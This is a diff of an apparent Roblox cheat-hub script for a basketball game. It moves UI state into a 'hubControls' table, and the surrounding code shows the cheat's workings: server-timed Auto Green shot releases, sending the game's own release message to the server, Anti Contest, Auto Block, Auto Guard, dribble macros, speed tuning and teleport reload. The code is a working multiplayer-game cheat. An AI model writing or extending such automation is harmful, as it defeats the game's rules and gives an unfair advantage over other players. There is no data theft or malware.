-        if not pending.confirmed then jellyStatus.Text = "No separate finish state was reported." end
+        if not pending.confirmed then hubControls.jellyStatus.Text = "No separate finish state was reported." end
     end
 end
 
@@ -8449,9 +8451,9 @@ shared.PracticalBasketballGymReleaseStop = unload
 -- one round trip before the middle of their heartbeats. The round trip is measured after every
 -- rated shot from the step the server actually stopped on.
 local timing = {seenSerial = 0, awaiting = {}}
-local ratingNames = {"Very Early", "Early", "Slightly Early", "Good", "Perfect", "Slightly Late", "Late", "Very Late"}
-local ratingOrder = {}
-for order, name in ipairs(ratingNames) do ratingOrder[string.lower(name) .. " release"] = order end
+hubControls.ratingNames = {"Very Early", "Early", "Slightly Early", "Good", "Perfect", "Slightly Late", "Late", "Very Late"}
+hubControls.ratingOrder = {}
+for order, name in ipairs(hubControls.ratingNames) do hubControls.ratingOrder[string.lower(name) .. " release"] = order end
 network.history = {}
 
 -- The shot log and the console. Appending to a file or printing to Real's console can hold a
@@ -8578,7 +8580,7 @@ do
     end)
     signals.ratings = signals.ratings or listen("InterfaceService", "ShowFeedback", function(contest, order)
         order = tonumber(order)
-        if order and ratingNames[order] then
+        if order and hubControls.ratingNames[order] then
             signals.feedback = {at = os.clock(), order = order, contest = tonumber(contest)}
             local v2ok, v2error = pcall(antiContestV2.feedback, tonumber(contest))
             if not v2ok then pcall(antiContestV2.fail, v2error) end
@@ -8755,12 +8757,12 @@ end
 
 local function showPing()
     if not network.latest then
-        pingStatus.Text = "Shift+F3 data ping unavailable."
+        hubControls.pingStatus.Text = "Shift+F3 data ping unavailable."
         return
     end
     local link = not model.loop and "release link not measured yet"
         or string.format(network.enabled and "release link %.0f ms" or "release link %.0f ms (ping ignored)", loopLatency() * 1000)
-    pingStatus.Text = string.format("Data ping %.2f ms  •  %s", network.latest * 1000, link)
+    hubControls.pingStatus.Text = string.format("Data ping %.2f ms  •  %s", network.latest * 1000, link)
 end
 
 local function watchPing(now)
@@ -9006,7 +9008,7 @@ function timing.plan(attempt)
     -- The server rates whichever step it wrote last, so the release must be handled between the
     -- first good step being written and the heartbeat after the last one. Aim for the middle.
     local aim = (arrival(first) + arrival(final) + period) / 2
-    local bias = (attempt.mode == jump and jumpBias.value or finishBias.value) / 1000
+    local bias = (attempt.mode == jump and hubControls.jumpBias.value or hubControls.finishBias.value) / 1000
     return {top = top, first = first, final = final, reach = reach, inWindow = inWindow, aim = aim,
         releaseAt = aim - attempt.loop + bias, step = step, period = period, slope = slope}
 end
@@ -9326,18 +9328,18 @@ function timing.queueFinish(attempt, releasedAt)
     if not autoJelly or not automationAvailable() or jelly or (attempt.stream.raw or 0) < 0.35 then return end
     if autoDunk and kind == "Dunk" then
         -- Auto Dunk asks for dunks: one the game has started stays a dunk. Layups get the finish.
-        jellyStatus.Text = "Dunk kept (Auto Dunk is on)."
+        hubControls.jellyStatus.Text = "Dunk kept (Auto Dunk is on)."
         return
     end
-    local style = finishStyles[config.finish]
+    local style = hubControls.finishStyles[config.finish]
     if not style.key then
-        style = finishStyles[nextFinish]
+        style = hubControls.finishStyles[nextFinish]
         nextFinish = 3 - nextFinish
     end
     jelly = {character = attempt.character, initialAction = action, style = style,
         releaseAt = releasedAt, pressAt = releasedAt + 0.052}
     attempt.finish.jelly = style.name
-    jellyStatus.Text = "Waiting for the finish window…"
+    hubControls.jellyStatus.Text = "Waiting for the finish window…"
 end
 
 -- Tells the server the shot key came up. Sending the game's own release message is exact.
@@ -9422,7 +9424,7 @@ end
 
 local function applyRating(attempt, rating, order)
     local mode = attempt.mode
-    order = order or ratingOrder[string.lower(rating)]
+    order = order or hubControls.ratingOrder[string.lower(rating)]
     attempt.green = signals.green or timing.greenWindow(attempt.meter)
     -- The rating must still reach the HUD if measuring the release goes wrong.
     local learned, result = pcall(timing.learn, attempt, order)
@@ -9680,7 +9682,7 @@ local actions = {
     ["Auto Jelly"] = function()
         autoJelly = not autoJelly
         if not autoJelly then cancelJelly() end
-        jellyStatus.Text = autoJelly and ("Ready for " .. finishStyles[config.finish].name .. " after release.")
+        hubControls.jellyStatus.Text = autoJelly and ("Ready for " .. hubControls.finishStyles[config.finish].name .. " after release.")
             or ""
         refresh()
     end,
@@ -9699,7 +9701,7 @@ local actions = {
         autoBlock.stop(); autoBlock.refresh(); refresh()
     end,
     ["Dribble combo"] = function()
-        if #combo.moves == 0 then macroStatus = "Choose at least one move."; refresh(); return end
+        if #combo.moves == 0 then hubControls.macroStatus = "Choose at least one move."; refresh(); return end
         local sequence = table.clone(combo.moves)
         beginMacro(sequence[1], sequence, 1)
     end,
@@ -9731,8 +9733,8 @@ local function assignable(key, target)
 end
 
 local function bindingMessage(message)
-    bindStatus = message
-    if type(capturing) == "table" or capturing == "Dribble combo" then macroStatus = message end
+    hubControls.bindStatus = message
+    if type(capturing) == "table" or capturing == "Dribble combo" then hubControls.macroStatus = message end
     if capturing == "Auto Guard" then defense.status.Text = message end
     if capturing == "Auto Block" and autoBlock.bindNote then autoBlock.bindNote.Text = message end
     refresh()
@@ -9778,9 +9780,9 @@ local function setBinding(key)
     refresh()
 end
 
-local settingSliders = {jumpBias = jumpBias, finishBias = finishBias, cadence = cadence,
-    boostStrength = boostStrength, glideStrength = glideStrength,
-    offBall = offBallSpeed, withBall = withBallSpeed, acceleration = acceleration,
+hubControls.settingSliders = {jumpBias = hubControls.jumpBias, finishBias = hubControls.finishBias, cadence = hubControls.cadence,
+    boostStrength = hubControls.boostStrength, glideStrength = hubControls.glideStrength,
+    offBall = hubControls.offBallSpeed, withBall = hubControls.withBallSpeed, acceleration = acceleration,
     guardRange = defense.range, guardSpacing = defense.spacing, guardStance = defense.stance,
     guardLead = defense.lead, guardResponse = defense.response, autoJoinInterval = courtJoin.interval}
 
@@ -9798,7 +9800,7 @@ local function captureConfig()
     }
     data.comboMoves = {}
     for i, move in ipairs(combo.moves) do data.comboMoves[i] = move[1] end
-    for name, sliderItem in pairs(settingSliders) do data.sliders[name] = sliderItem.value end
+    for name, sliderItem in pairs(hubControls.settingSliders) do data.sliders[name] = sliderItem.value end
     data.binds["Auto Guard"] = false
     data.binds["Court teleport"] = false
     for target, key in pairs(bindings) do
@@ -9825,7 +9827,7 @@ local function restoreBindings(data)
     end
     local saved = type(data.binds) == "table" and data.binds or {Menu = "RightShift"}
     local macroBinds = type(data.macroBinds) == "table" and data.macroBinds or {}
-    for _, name in ipairs(bindNames) do restore(name, saved[name]) end
+    for _, name in ipairs(hubControls.bindNames) do restore(name, saved[name]) end
     restore("Dribble combo", saved["Dribble combo"])
     for _, move in ipairs(moves) do restore(move, macroBinds[move[1]]) end
     if not bindings[spinMove] then restore(spinMove, macroBinds["Spin R to L"]) end
@@ -9860,7 +9862,7 @@ local function applyConfig(data)
     visualExtras.apply(data.visuals)
     menuLayout.apply(data.menu)
     local values = type(data.sliders) == "table" and data.sliders or {}
-    for name, item in pairs(settingSliders) do
+    for name, item in pairs(hubControls.settingSliders) do
         local value = values[name]
         showSlider(item, type(value) == "number" and value == value and value or item.default)
     end
@@ -9884,13 +9886,13 @@ local function applyConfig(data)
     rage.apply(data.rage)
     antiContestV2.apply(data.antiContestV2)
     updateThreePointLines()
-    jellyStatus.Text = autoJelly and ("Ready for " .. finishStyles[config.finish].name .. " after release.")
+    hubControls.jellyStatus.Text = autoJelly and ("Ready for " .. hubControls.finishStyles[config.finish].name .. " after release.")
         or ""
     showPing()
 end
 
 local function configUpdate(message)
-    configStatus = message
+    hubControls.configStatus = message
     refresh()
 end
 
@@ -9953,7 +9955,7 @@ function timing.watch(now, frameDt)
         if feedback and not feedback.used then
             -- A rating for a shot this script was not following.
             feedback.used = true
-            local rating = ratingNames[feedback.order] .. " Release"
+            local rating = hubControls.ratingNames[feedback.order] .. " Release"
             timing.await(rating, signals.serial)
             hud.onRating("Shot (untracked)", rating)
             shotLog.say("Untracked shot | " .. rating .. " | last key press not followed: " .. tostring(timing.refused or "no key press seen"))
@@ -10014,7 +10016,7 @@ function timing.watch(now, frameDt)
         local verdict = signals.feedback
         if verdict and not verdict.used then
             verdict.used = true
-            local rating = ratingNames[verdict.order] .. " Release"
+            local rating = hubControls.ratingNames[verdict.order] .. " Release"
             if attempt.armedAt or (not signals.meters and not waiting) then
                 attempt.rated = verdict
                 if attempt.held then
@@ -10307,7 +10309,7 @@ connect(menuHint.Activated, function()
     currentPage = "Keybinds"
     beginBinding("Menu")
 end)
-for name, row in pairs(bindRows) do
+for name, row in pairs(hubControls.bindRows) do
     connect(row.Activated, function() beginBinding(name) end)
 end
 connect(combo.movesTab.Activated, function() combo.editing, capturing = false, nil; refresh() end)
@@ -10321,21 +10323,21 @@ connect(combo.remove.Activated, function()
     if combo.moves[combo.slot] then table.remove(combo.moves, combo.slot) end
     refresh()
 end)
-for move, row in pairs(moveRows) do
+for move, row in pairs(hubControls.moveRows) do
     connect(row.Activated, function()
         if combo.editing then
             combo.moves[combo.slot] = move
             combo.slot = math.min(combo.slot + 1, #combo.moves + 1, 5)
-            capturing, macroStatus = nil, ""
+            capturing, hubControls.macroStatus = nil, ""
             refresh()
             return
         end
         selectedMove, capturing = move, nil
-        macroStatus = ""
+        hubControls.macroStatus = ""
         refresh()
     end)
 end
-connect(runMacroButton.Activated, function() beginMacro(selectedMove) end)
+connect(hubControls.runMacroButton.Activated, function() beginMacro(selectedMove) end)
 connect(defense.toggle.row.Activated, actions["Auto Guard"])
 defense.bindControls(connect, refresh)
 connect(defense.footworkSwitch.row.Activated, function()
@@ -10348,10 +10350,10 @@ connect(antiStun.toggle.row.Activated, function()
     refresh()
 end)
 connect(defense.bind.Activated, function() beginBinding("Auto Guard") end)
-connect(bindMacroButton.Activated, function() beginBinding(selectedMove) end)
-connect(keysSwitch.row.Activated, actions["Auto Green"])
-connect(pingSwitch.row.Activated, actions["Ping compensation"])
-connect(approachSwitch.row.Activated, actions["Auto Dunk"])
+connect(hubControls.bindMacroButton.Activated, function() beginBinding(selectedMove) end)
+connect(hubControls.keysSwitch.row.Activated, actions["Auto Green"])
+connect(hubControls.pingSwitch.row.Activated, actions["Ping compensation"])
+connect(hubControls.approachSwitch.row.Activated, actions["Auto Dunk"])
 connect(shotInput.manualSwitch.row.Activated, function()
     shotInput.manualOnly=not shotInput.manualOnly
     approach=nil
@@ -10360,21 +10362,21 @@ connect(shotInput.manualSwitch.row.Activated, function()
     end
     refresh()
 end)
-connect(jellySwitch.row.Activated, actions["Auto Jelly"])
-connect(movementSwitch.row.Activated, actions["Movement tuning"])
-connect(boostSwitch.row.Activated, actions["Dribble boost"])
-connect(glideSwitch.row.Activated, actions["Dribble glide"])
-connect(styleButton.Activated, function()
-    config.finish = config.finish % #finishStyles + 1
+connect(hubControls.jellySwitch.row.Activated, actions["Auto Jelly"])
+connect(hubControls.movementSwitch.row.Activated, actions["Movement tuning"])
+connect(hubControls.boostSwitch.row.Activated, actions["Dribble boost"])
+connect(hubControls.glideSwitch.row.Activated, actions["Dribble glide"])
+connect(hubControls.styleButton.Activated, function()
+    config.finish = config.finish % #hubControls.finishStyles + 1
     cancelJelly()
-    jellyStatus.Text = "Selected " .. finishStyles[config.finish].name .. "."
+    hubControls.jellyStatus.Text = "Selected " .. hubControls.finishStyles[config.finish].name .. "."
     refresh()
 end)
-connect(slotButton.Activated, function()
+connect(hubControls.slotButton.Activated, function()
     local slot = settings.slot % 3 + 1
     savePreference("slot", slot, "Selected slot " .. slot .. ".")
 end)
-connect(saveButton.Activated, function()
+connect(hubControls.saveButton.Activated, function()
     local slot = tostring(settings.slot)
     local previous = settings.slots[slot]
     settings.slots[slot] = captureConfig()
@@ -10385,12 +10387,12 @@ connect(saveButton.Activated, function()
         configUpdate("Real could not save the config.")
     end
 end)
-connect(loadButton.Activated, loadSelectedConfig)
-connect(autoLoadSwitch.row.Activated, function()
+connect(hubControls.loadButton.Activated, loadSelectedConfig)
+connect(hubControls.autoLoadSwitch.row.Activated, function()
     local enabled = not settings.autoLoad
     savePreference("autoLoad", enabled, enabled and "Auto-load enabled for the selected slot." or "Auto-load disabled.")
 end)
-connect(reloadSwitch.row.Activated, function()
+connect(hubControls.reloadSwitch.row.Activated, function()
     if not queueAvailable() then
         configUpdate("Teleport reload is unavailable in this Real session.")
         return
@@ -10401,16 +10403,16 @@ connect(reloadSwitch.row.Activated, function()
         revokeReload()
     end
 end)
-connect(threeSwitch.row.Activated, function()
+connect(hubControls.threeSwitch.row.Activated, function()
     drawThree = not drawThree
     updateThreePointLines()
     refresh()
 end)
-connect(resetButton.Activated, function()
+connect(hubControls.resetButton.Activated, function()
     if shot then return end
     timing.restore(nil)
-    showSlider(jumpBias, jumpBias.default)
-    showSlider(finishBias, finishBias.default)
+    showSlider(hubControls.jumpBias, hubControls.jumpBias.default)
+    showSlider(hubControls.finishBias, hubControls.finishBias.default)
     for _, mode in ipairs(modes) do
         mode.result, mode.detail = "Timing reset.", timing.peakText()
     end
@@ -10500,7 +10502,7 @@ if input.TouchEnabled then
         drag, sliderDrag, capturing = nil, nil, nil
     end)
 end
-connect(closeButton.Activated, function()
+connect(hubControls.closeButton.Activated, function()
     gui.Enabled = false
     drag, sliderDrag, capturing = nil, nil, nil
 end)
@@ -10508,7 +10510,7 @@ connect(menuLayout.resetButton.Activated, function()
     drag = nil
     menuLayout.apply(nil)
 end)
-connect(unloadButton.Activated, unload)
+connect(hubControls.unloadButton.Activated, unload)
 connect(backdrop:GetPropertyChangedSignal("AbsoluteSize"), function()
     drag = nil
     resize()
